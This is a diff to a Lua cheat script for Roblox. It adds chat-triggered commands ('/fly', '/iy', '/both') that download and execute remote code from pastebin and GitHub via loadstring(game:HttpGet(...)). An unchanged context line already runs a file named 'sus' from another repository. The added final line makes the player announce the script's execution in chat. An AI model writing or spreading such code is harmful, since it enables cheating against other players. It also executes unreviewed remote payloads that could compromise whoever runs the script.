@@ -48,7 +48,17 @@ game.Players.LocalPlayer.Chatted:connect(function(cht)
 		InfiniteJumpEnabled = false
 	elseif cht:match ("/unqueue") then
 		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unqueue)
+	elseif cht:match("/fly") or cht:match("/opengui") then
+	loadstring(game:HttpGet("https://pastebin.com/raw/UXmbai5q", true))()
+	
+	elseif cht:match("/both") or cht:match("/opengui") then
+	loadstring(game:HttpGet("https://pastebin.com/raw/UXmbai5q", true))()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+	
+	elseif cht:match("/iy") then
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
 		end end)
 		
 		
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/storematelamo/nto/main/sus'),true))()
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Executed In 0.35 Seconds!","all")
